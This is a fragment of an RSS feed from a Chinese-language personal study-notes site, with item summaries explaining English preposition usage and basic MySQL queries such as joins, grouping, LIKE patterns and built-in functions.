      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/outside/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/outside/</guid>
      <description>outside 表示位置 outside + 位置或地点的词语 表示在某个地方的外面或外部。
 The temperature outside my house is ver low.  </description>
    </item>
    
    <item>
      <title>English with</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/with/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/with/</guid>
      <description>with 表示同伴 with +人或动物的词语 表示与&amp;hellip;一起。
 I go to the park with my daughter every day. I take the bus with her. She was with her friend last night.  表示具有/携带 with + 事物的词语
表示具有&amp;hellip;。
 The girl with big eyes and yellow hair is my daughter. I want to buy a house with a swimming pool. The boy with a book is my friend.  表示工具 with +具体工具的词语。
表示用&amp;hellip;/以&amp;hellip;。</description>
    </item>
    
    <item>
      <title>English within</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/within/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/within/</guid>
      <description>within 表示时间 within +一段时间的词语 表示在一段时间之内。
 We will be famous within five years. We will finsh our course within a month.  </description>
    </item>
    
    <item>
      <title>English without</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/without/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/without/</guid>
      <description>without 表示没有 without + 事物的词语 表示没有带某个物品 。强调本来应该带某物，但是因为疏忽或其他原因没有带就去做其他事情的情况
 He went out without his hat. He went to the restaurant without money.  without + 动名词/动名词短语 表示没有做某事，就去做另外一件事去了。
 She always attends my class without eating dinner.  表示条件 without + 某人/某物 表示如果没有，就&amp;hellip;
 without air, we could not live.  </description>
    </item>
    
    <item>
      <title>MySQL 等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>等值链接 判断不同表中都包含的字段是否相等，相等则显示，不等则过滤。且一般都用=来判断。
查询的是多张表的交集字段。
一般需要为表起别名。
注意
使用链接查询，很多时候容易出现Column &#39;字段名&#39; in ambiguousfield 错误，这种情况一般是因为不同的表中含有相同的字段名，导致系统无法知道我们到底要查询哪个表中的字段。这个时候只需要指定一下我们要查询的是哪个表中的字段即可。
查询女神名所对应的男神名 SELECT name,boyName FROM beauty,boys WHERE beauty.boyfriend_id = boys.id; 查询员工名所对应的部门名 SELECT last_name AS 员工名,department_name AS 部门名 FROM employees,departments WHERE employees.department_id = departments.department_id 查询员工名、工种号、工种名 链接查询通常比较长，因此我们可以给表定义一个别名。
注意，如果我们为一些表起了别名之后，后续的语句当中如果需要用到这些表，则只能用我们定义的别名，不能用原本的表名。
# 因为jobs 表和 employees 表中都用 job_id， # 系统不知道我们到底要查询哪一个， # 因此，这里需要指定一下我们要查询哪个表中的job_id SELECT last_name,员工表.job_id,job_title FROM employees AS 员工表, jobs AS 工种表 WHERE 员工表.job_id = 工种表.job_id; 查询城市名中第二个字符为 o 的部门和城市名 SELECT department_name,	city FROM departments AS 部门表,locations AS 位置表 WHERE 部门表.</description>
    </item>
    
    <item>
      <title>MySQL 自链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E8%87%AA%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E8%87%AA%E9%93%BE%E6%8E%A5/</guid>
      <description>自链接 判断同一张表中的不同字段是否相等，相等则显示，不相等则过滤。
需要给同一张表取不同的别名，让系统分清同一张表中的不同字段。
查询员工名所对应的领导名 SELECT 员工表.last_name AS 员工,领导表.last_name AS 领导 FROM employees AS 员工表, employees AS 领导表 WHERE 员工表.manager_id= 领导表.employee_id; </description>
    </item>
    
    <item>
      <title>MySQL 非等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>非等值链接 新建查询并运行。
CREATE TABLE job_grades (grade_level VARCHAR(3),  lowest_sal int,  highest_sal int);  INSERT INTO job_grades VALUES (&amp;#39;A&amp;#39;, 1000, 2999);  INSERT INTO job_grades VALUES (&amp;#39;B&amp;#39;, 3000, 5999);  INSERT INTO job_grades VALUES(&amp;#39;C&amp;#39;, 6000, 9999);  INSERT INTO job_grades VALUES(&amp;#39;D&amp;#39;, 10000, 14999);  INSERT INTO job_grades VALUES(&amp;#39;E&amp;#39;, 15000, 24999);  INSERT INTO job_grades VALUES(&amp;#39;F&amp;#39;, 25000, 40000); 查询员工的工资和工资级别 SELECT salary,grade_level FROM employees AS 员工表, job_grades 工资等级表 WHERE 员工表.salary BETWEEN 工资等级表.lowest_sal AND 工资等级表.</description>
    </item>
    
    <item>
      <title>English around</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/around/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/around/</guid>
      <description>around 表示运动 around + 人或物的词语 表示围着&amp;hellip;环绕。
 The earth goes around the sun. We walk around the lake. The mouse ran around the room.  表示地点 around + 地点或位置的词语 表示在&amp;hellip;周围/附近。
 The man sells DVDs around the station. The children sat around the teacher. The banana trees are around the pond.  表示数量 around 修饰数词 表示大约&amp;hellip;。
 The number of listeners tonight is around 89.  </description>
    </item>
    
    <item>
      <title>English to</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/to/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/to/</guid>
      <description>to 表示方向 表示动作位移的词语 + to + 地方的词语 表示向某个地方移动。
 I will to Chongqing tomorrow. I walk to the park every morning.  表示时间/程度/结果 from&amp;hellip;to 表示从&amp;hellip;到&amp;hellip;。
 He works from morning to night. He will fly from the moon to the earth.  表示目的 to + 一些词语 表示为了&amp;hellip;
 We sat down to dinner.  表示比较 by + 数词 + to + 数词 表示几比几。
 We won the game by 5 to 3.</description>
    </item>
    
    <item>
      <title>English under</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/under/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/under/</guid>
      <description>under 表示位置 under + 位置的词语 表示在&amp;hellip;下方。强调的是垂直 90 度的下方。
 The are palying mahjong under the tree. The man under the bridge is Jeff.  表示年龄 under + 年龄/数量/重量的词语 表示不到&amp;hellip;/在&amp;hellip;以下。
 He is under ten years old.  表示过程 under + 某些词语 表示在&amp;hellip;过程中。
 The road is under repair.  </description>
    </item>
    
    <item>
      <title>English up</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/up/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/up/</guid>
      <description>up 表示运动方向 运动趋势的词语 +up + 位置或地点名词 表示向&amp;hellip;上/沿着&amp;hellip;。
 He ran up the hill. We went up the house.  表示位置 up + 位置的名词 表示在&amp;hellip;上面
 They live up the street. The cath fish up the river.  </description>
    </item>
    
    <item>
      <title>English near</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/near/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/near/</guid>
      <description>near 表示时间、空间 near + 地点或位置的词语 表示接近某个地方，对于 beside 和 by 来说，near 更加强调空间上的靠近或接近，而不是单一的在&amp;hellip;旁边。
另外 near 还表示相对的近。比如广西和广东，相对于中国来说，就他们离得很近，但是如果相对于人来说，依旧离得很远。
 You sit near me. I live near a river. The lake near my house is very big.  near + 具体时间点的词语 表示快要接近某个时间点了。
 It is near 2023. It is near 19:00. It is near spring festival.  </description>
    </item>
    
    <item>
      <title>English of</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/of/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/of/</guid>
      <description>of 表示&amp;hellip;的 of + 无生命的名词所有格/动名词短语/代词/数词 表示**&amp;hellip;的**
 The price of this coat. The color of my shirt.  of + 比较长的生命的名词 表示.&amp;hellip;的
 It is the story of my lady Mary, Queen of Scots. She is the daughter of my English teacher, Nick.  </description>
    </item>
    
    <item>
      <title>English off</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/off/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/off/</guid>
      <description>off 表示离开 固定搭配 off 作介词短时候，用法跟 from、out、of 很相似。
off 大多数情况都要跟一些特定的动词搭配，构成一个介词短语。
 Keep off the grass He fell the ladder She fell off the roof  </description>
    </item>
    
    <item>
      <title>English past</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/past/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/past/</guid>
      <description>past 表示时间 数词（几分钟） + past + 几点钟 表示几点过了几分钟，而且，只能表示半小时以及半小时之内的时间。
 30 past 7 = 7:30 = half past 7（表示 7 点过了 30 分钟）  但这种结构，不能作介词短语，因为它仅仅只是一个表示时间的数词。想要作时间状语造句，必须跟其他介词构成介词短语。
 I begin my class at 25 past 7.  有时候 past 构成的数词也可以直接作表语。
It is + 数词 + past +几点 表示现在是几点钟。
 It is 20 past 8. It is half past ten  表示超过 past + 数量或年龄的词语 表示超过某个年龄或超过某个数量。
 He is past sixty year old.  </description>
    </item>
    
    <item>
      <title>MySQL COUNT</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/count/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/count/</guid>
      <description>COUNT COUNT(*) 统计表的行数，在统计结果的时候，不会忽略字段值为 NULL 的行。
这种写法用的比较多，因为在一般的存储引擎下，COUNT(*)的效率通常比较高。
COUNT(1) 忽略所有字段，1 表示一个固定值，也可以用 COUNT(2)、COUNT(3) 代替，在统计结果的时候，不会忽略字段值为 NULL 的行。
COUNT(字段名) 统计指定字段名的值有多少行，字段值为 NULL 的行会被忽略统计。
COUNT(DISTINCT 字段名) 统计指定字段名的值有多少行，，字段值为 NULL 或重复的行会被忽略统计。</description>
    </item>
    
    <item>
      <title>MySQL 分组查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/</guid>
      <description>分组查询 通过一定的规则将一个数据集划分为若干个小组，然后对这些小组中的数据进行处理。
语法 SELECT 字段名 FROM 表名 WHERE 分组前的筛选条件 GROUP BY 依照哪个字段进行分组 ORDER BY 排序列表 HAVING 分组后的筛选条件 查询列表必须特殊，必须实分组函数和 GROUP BY后面出现的字段。
分组查询的筛选条件被分为分组前的筛选和分组后的筛选
WHERE 和 HAVING WHERE，分组之前的筛选条件，数据来源是原始表。
HAVING，分组之后的筛选条件，数据来源是经过 WHERE 筛选后的表。
用先用 WHERE 来进行筛选的，优先考虑先用 WHERE 来进行筛选。
按单个字段分组 查询每个工种的最高工资 SELECT MAX(salary),job_id FROM employees GROUP BY job_id 查询每个部门，邮箱中包含 a 字符的平均工资 SELECT AVG(salary), department_id FROM employees WHERE email LIKE &amp;#39;%a%&amp;#39; GROUP BY department_id 查询每个领导手下有奖金的员工的最高工资 SELECT MAX(salary),manager_id FROM employees WHERE commission_pct IS NOT NULL GROUP BY manager_id 查询哪些部门的员工数 &amp;gt; 2 SELECT COUNT(*) AS 员工个数, department_id FROM employees GROUP BY department_id HAVING 员工个数 &amp;gt;2; 查询哪些工种编号的最高工资 &amp;gt; 12000 SELECT MAX(salary) AS 最高工资, job_id FROM employees WHERE commission_pct IS NOT NULL GROUP BY job_id HAVING 最高工资 &amp;gt;12000; 查询哪些领导编号 &amp;gt;102 ，且最低工资 &amp;gt; 5000 SELECT MIN(salary) AS 最低工资,manager_id FROM employees WHERE manager_id &amp;gt; 102 GROUP BY manager_id HAVING 最低工资 &amp;gt; 5000; 按表达式或函数分组 按员工姓的长度分组，查询每组员工个数 &amp;gt;5 的组 SELECT COUNT(*) AS 员工个数,LENGTH(last_name) AS 这些员工的姓名长度 FROM employees GROUP BY LENGTH(last_name) HAVING 员工个数 &amp;gt; 5 按多个字段分组 将GROUP BY后面的多个字段用,隔开即可。</description>
    </item>
    
    <item>
      <title>MySQL 链接查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/</guid>
      <description>链接查询 当需要从多张表中查询数据，而这些表之间有关联字段的时候，需要使用连接查询。</description>
    </item>
    
    <item>
      <title>MySQL CREATE</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/ddl/create/</link>
      <pubDate>Sun, 24 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/ddl/create/</guid>
      <description>创建表 mysql&amp;gt; create table rainy(  -&amp;gt; id int,  -&amp;gt; name varchar(20)); Query OK, 0 rows affected (0.01 sec) </description>
    </item>
    
    <item>
      <title>MySQL 其他函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 24 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0/</guid>
      <description>其他函数 查询 MySQL 版本号 SELECT VERSION(); 查询当前处于哪个数据库 SELECT DATABASE(); 查询当前用户 SELECT USER() </description>
    </item>
    
    <item>
      <title>MySQL INSERT</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dml/insert/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dml/insert/</guid>
      <description>INSERT 用于向数据库中的表插入数据。
插入数据 使用insert into TableName;来插入一些数据，TableName 是要插入数据的表的名称。
mysql&amp;gt; insert into rainy (id,name) values(1,&amp;#39;su&amp;#39;); Query OK, 1 row affected (0.00 sec) 我们插入数据后重新查询表中的数据：
mysql&amp;gt; select * from rainy; +------+------+ | id | name | +------+------+ | 1 | su | | 1 | su | +------+------+ 2 rows in set (0.00 sec) </description>
    </item>
    
    <item>
      <title>MySQL SHOW</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/show/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/show/</guid>
      <description>SHOW SHOW ENGINES 查看 MySQL 支持的存储引擎。
SHOW ENGINES; # 显示二进制文件以及文件大小（需要开启二进制日志记录功能） SHOW {BINARY | MASTER} LOGS  # 显示二进制文件的执行过程 SHOW BINLOG EVENTS [IN &amp;#39;log_name&amp;#39;] [FROM pos] [LIMIT [offset,] row_count]  # 显示MySQL当前支持哪些字符集 SHOW CHARACTER SET [like_or_where]  # 显示MySQL支持字符集的排序规则 SHOW COLLATION [like_or_where]  # 显示表的列信息（等同于DESC，需要先创建表） SHOW [FULL] COLUMNS FROM tbl_name [FROM db_name] [like_or_where]  # 显示已经创建的库，创建时的语句 SHOW CREATE DATABASE db_name  # 显示已经创建的事件，创建时的语句 SHOW CREATE EVENT event_name  # 显示已经创建的函数，创建时的语句 SHOW CREATE FUNCTION func_name  # 显示已经创建的存储过程，创建时的语句 SHOW CREATE PROCEDURE proc_name  # 显示已经创建的表，创建时的语句 SHOW CREATE TABLE tbl_name  # 显示已经创建的触发器，创建时的语句 SHOW CREATE TRIGGER trigger_name  # 显示已经创建的视图，创建时的语句 SHOW CREATE VIEW view_name  # 显示mysql中所有数据库的名称 SHOW DATABASES [like_or_where]  # 显示存储引擎的详细信息 SHOW ENGINE engine_name {STATUS | MUTEX}  # 显示数据库支持的存储引擎和默认存储引擎 SHOW [STORAGE] ENGINES  # 显示最后一个执行语句所产生的错误信息 SHOW ERRORS [LIMIT [offset,] row_count]  # 显示事件信息 SHOW EVENTS  # 服务器内部调试，显示一个指定存储的内部实现的表示形式过程 SHOW FUNCTION CODE func_name  # 显示存储函数信息（需要先创建存储函数） SHOW FUNCTION STATUS [like_or_where]  # 显示指定用户拥有的权限 SHOW GRANTS FOR user  # 显示表索引信息（需要先创建索引） SHOW INDEX FROM tbl_name [FROM db_name]  # 显示Master当前正在使用的二进制信息 SHOW MASTER STATUS  # 列举在表缓存中当前被打开的非TEMPORARY表 SHOW OPEN TABLES [FROM db_name] [like_or_where]  # 显示MySQL插件信息 SHOW PLUGINS  # 服务器内部调试，显示一个指定存储的内部实现的表示形式过程 SHOW PROCEDURE CODE proc_name  # 显示存储过程信息（需要先创建存储过程） SHOW PROCEDURE STATUS [like_or_where]  # 显示MySQL所支持的所有权限，及权限可操作的对象 SHOW PRIVILEGES  # 显示系统中正在运行的所有进程，普通用户只能查看自己的进行信息 SHOW [FULL] PROCESSLIST  # 显示当前会话执行语句资源使用情况 SHOW PROFILE [types] [FOR QUERY n] [OFFSET n] [LIMIT n]  # 显示当前会话执行语句资源使用情况 SHOW PROFILES  # 显示relaylog事件信息（需要先做主从复制） SHOW RELAYLOG EVENTS [IN &amp;#39;log_name&amp;#39;] [FROM pos] [LIMIT [offset,] row_count]  # 显示Master主机上已注册的复制主机列表（需要先做主从复制） SHOW SLAVE HOSTS  # 显示Slave主机状态信息（需要先做主从复制） SHOW SLAVE STATUS [FOR CHANNEL channel]  # 显示MySQL状态信息 SHOW [GLOBAL | SESSION] STATUS [like_or_where]  # 显示表属性信息 SHOW TABLE STATUS [FROM db_name] [like_or_where]  # 显示当前数据库中所有表的名称 SHOW [FULL] TABLES [FROM db_name] [like_or_where]  # 显示触发器信息（需要先创建触发器） SHOW TRIGGERS [FROM db_name] [like_or_where]  # 显示MySQL变量信息 SHOW [GLOBAL | SESSION] VARIABLES [like_or_where]  # 显示最后一个执行语句所产生的警告信息 SHOW WARNINGS [LIMIT [offset,] row_count] </description>
    </item>
    
    <item>
      <title>MySQL UPDATE</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dml/update/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dml/update/</guid>
      <description>UPDATE 用于修改或更新数据库中表的数据。
修改表中的数据 mysql&amp;gt; update rainy set name=&amp;#39;zhu&amp;#39;where id=1; Query OK, 2 rows affected (0.03 sec) Rows matched: 2 Changed: 2 Warnings: 0 修改后重新查询表中的数据：
mysql&amp;gt; select * from rainy; +------+------+ | id | name | +------+------+ | 1 | zhu | | 1 | zhu | +------+------+ 2 rows in set (0.00 sec) </description>
    </item>
    
    <item>
      <title>MySQL 函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 函数之间可以嵌套
语法 SELECT 函数名(实参列表,表名) 单行函数 主要用于处理数据，传入一个参数，返回一个值。
 字符函数，传入的参数为字符串类型。 数学函数，传入的参数为数字类型。 日期函数，传入的参数为日期类型。 其他函数 流程控制函数，可以实现一些分支结构。  分组函数 主要用于统计数据，传入一组参数，并返回一个值，也叫统计函数、组函数、聚合函数。</description>
    </item>
    
    <item>
      <title>MySQL 数学函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0/</guid>
      <description>数学函数 用于对数字进行处理，或者返回一个数值。
ROUND(X,D) 计算将 X 四舍五入后，保留 D 位小数后的值。
SELECT ROUND(45.4) CEIL(X) 计算将 X 向上取整后的值，这个值 &amp;gt;= X 的最小整数。
SELECT CEIL(1.52) # 返回 1 SELECT CEIL(1) FLOOR(X) 计算将 X 向下取整后的值，这个值 &amp;lt;= X 的最大整数。
SELECT FLOOR(1.2) # 返回 1 SELECT FLOOR(9.9) TRUNCATE(X,D) 不将 X 进行四舍五入，直接保留 D 位小数，或者说是直接截断。
SELECT TRUNCATE(1.69999,2) MOD(N,M) 计算用 N 除以 M 的余数，相当于 N % M。
但%实际上的计算过程是N - (N/M*M)。
SELECT MOD(10,3) # 相当于 SELECT 10 % 3 </description>
    </item>
    
    <item>
      <title>MySQL 日期函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>日期函数 用于对日期进行处理，或者返回一个日期的值。
日期格式符号    格式符 功能     %Y 四位的年份   %y 两位的年份   %m 月份(01 - 12)   %c 月份(1 - 12)   %d 日(01, 02, …)   %H 小时(24 小时制)   %h 小时(12 小时制)   %i 分钟(00 - 59)   %s 秒(00 - 59)   %U 星期(0 - 52)，星期天为第一天   %u 星期(0 - 52)，星期一为第一天   %W 星期英文(Sunday — Saturday)   %M 月份英文(January — December)    NOW() 返回系统当前的日期和时间。</description>
    </item>
    
    <item>
      <title>MySQL 模糊查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2/</guid>
      <description>模糊查询 LIKE 查询某个字段中所有包含单个或多个字符的数据
查询员工名中第三个字符为 n，第五个字符为 l 的员工名和工资 _通配符，表示匹配任意单个字符。
SELECT last_name, salary FROM employees WHERE last_name LIKE # 第三个字符为 n，第五个字符为 l 的数据 &amp;#39;__n_l%&amp;#39;; 查询员工名中第二个字符为 _ 的员工名 \转义字符，表示特殊的控制意义，一般用于格式控制。
SELECT last_name, salary FROM employees WHERE last_name LIKE &amp;#39;_\_%&amp;#39;; ESCAPE关键字可以让我们自定义转义字符。
SELECT last_name, salary FROM employees WHERE last_name LIKE &amp;#39;_$_%&amp;#39; # 自定义一个转义字符 $ ESCAPE &amp;#39;$&amp;#39;; 查询员工名中包含字符 a 的员工信息 %通配符，表示匹配任意多个字符，且包含 0 个字符。
